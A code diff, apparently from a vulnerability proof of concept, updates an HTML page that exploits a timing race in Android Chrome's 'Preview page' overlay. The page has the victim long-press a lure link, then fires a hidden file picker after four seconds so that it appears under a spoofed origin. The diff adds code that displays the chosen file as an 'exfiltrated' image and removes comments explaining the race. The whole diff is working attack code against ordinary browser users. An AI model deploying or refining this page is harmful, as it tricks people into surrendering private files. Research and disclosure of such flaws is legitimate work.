@@ -74,6 +74,14 @@
         border-top: 1px solid #eee;
         padding-top: 20px;
       }
+      /* Style untuk gambar yang dicuri */
+      #exfiltrated-image {
+        margin-top: 15px;
+        max-width: 100%;
+        border-radius: 8px;
+        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+        display: none;
+      }
     </style>
   </head>
   <body>
@@ -88,7 +96,6 @@
         To view the encrypted file, please perform the following interaction:
       </p>
 
-      <!-- User must Long-Press this link -->
       <a id="trigger-link" href="https://drive.google.com/">
         Hold here & select "Preview page"
       </a>
@@ -114,6 +121,8 @@
             overflow-x: auto;
           "
         ></pre>
+        <!-- Elemen Gambar Baru -->
+        <img id="exfiltrated-image" src="" alt="Exfiltrated Content" />
       </div>
     </div>
 
@@ -123,34 +132,37 @@
       const statusBox = document.getElementById("status-box");
       const previewArea = document.getElementById("preview-area");
       const fileOutput = document.getElementById("file-output");
+      const exfiltratedImg = document.getElementById("exfiltrated-image");
 
-      // Step 1: Detect the Long-Press (Context Menu)
       triggerLink.addEventListener("contextmenu", function () {
         statusBox.innerText =
           "Interaction detected. Launching race condition...";
-
-        // Step 2: The Race Condition
-        // 4 seconds is usually the "sweet spot" for a user to long-press
-        // and then tap "Preview page" in the Android Chrome UI.
         setTimeout(function () {
           hiddenFilePicker.click();
-          console.log("File picker triggered behind the Preview overlay.");
           statusBox.innerText = "Payload triggered. Check overlay.";
         }, 4000);
       });
 
-      // Step 3: Handle the 'Stolen' File
       hiddenFilePicker.onchange = function (e) {
         const file = e.target.files[0];
         if (file) {
           statusBox.className = "success";
           statusBox.innerText = "SUCCESS: Origin Spoofing Confirmed.";
           previewArea.style.display = "block";
+
           fileOutput.innerText =
             `Name: ${file.name}\n` +
             `Size: ${file.size} bytes\n` +
             `Type: ${file.type}\n` +
             `Last Modified: ${new Date(file.lastModified).toLocaleString()}`;
+
+          // Logika untuk menampilkan gambar jika tipenya sesuai
+          if (file.type.startsWith("image/")) {
+            exfiltratedImg.src = URL.createObjectURL(file);
+            exfiltratedImg.style.display = "block";
+          } else {
+            exfiltratedImg.style.display = "none";
+          }
         }
       };
     </script>
